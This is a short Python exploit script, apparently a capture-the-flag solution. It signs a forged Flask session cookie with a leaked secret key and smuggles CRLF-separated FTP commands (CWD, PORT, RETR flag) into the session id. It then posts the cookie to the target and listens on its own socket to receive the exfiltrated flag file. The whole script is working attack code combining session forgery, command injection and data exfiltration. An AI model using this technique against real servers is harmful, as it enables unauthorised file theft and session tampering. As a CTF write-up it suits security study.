import socket
import sys
import requests
from itsdangerous import URLSafeTimedSerializer
from flask.json.tag import TaggedJSONSerializer
import hashlib
from threading import Thread

# Leaked Flask key from the Git repository
KEY = "According to all known laws of aviation, there is no way a bee should be able to fly."

host = sys.argv[1]


# Formats our ip:port per the RFC765 specification of the PORT command
# TL;DR -> h1,h2,h3,h4,p1,p2 where p1 is the 8 higher order bits and p2 is the 8 lower order bits of the port
def format_port(ip: str, port: int) -> str:
    ip_parts = ip.split(".")
    port_h, port_l = port // 256, port % 256
    return ",".join(ip_parts + [str(port_h), str(port_l)])


# Setup a data connection on a random available port
data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
data_sock.bind(("0.0.0.0", 0))
data_sock.listen()

# Get our public IP and the listening port
ip = socket.gethostbyname(socket.gethostname())
port = data_sock.getsockname()[1]
port_fmt = format_port(ip, port)

# Create a payload that:
# - Closes the initial STOR with a valid filename,
# - Goes back to the root folder (we can't use /),
# - Sets the data transfer ip:port for active mode,
# - Starts a transfer for /flag,
# - Adds a NOOP to use the .json cleanly.
payload = (
    "some_file\r\n" + "CWD ..\r\n" + f"PORT {port_fmt}\r\n" + "RETR flag\r\n" + "NOOP "
)

# Create and sign a Flask session cookie with our payload
signing_serializer = URLSafeTimedSerializer(
    [KEY],
    salt="cookie-session",
    serializer=TaggedJSONSerializer(),
    signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1},
)

crafted_session = signing_serializer.dumps({"sid": payload})


# Start listening for an inbound data connection, print flag when received
def listen_for_flag():
    sock, _ = data_sock.accept()
    sock = socket.SocketIO(sock, mode="r")
    flag = sock.readall().decode()
    print(flag)


flag_thread = Thread(target=listen_for_flag)
flag_thread.start()

# Send a triage submission with our payload
requests.post(
    host + "/submit",
    data={"name": "a", "temperature": 0, "symptoms": "a"},
    cookies={"session": crafted_session},
)

print("Sent off submission.")
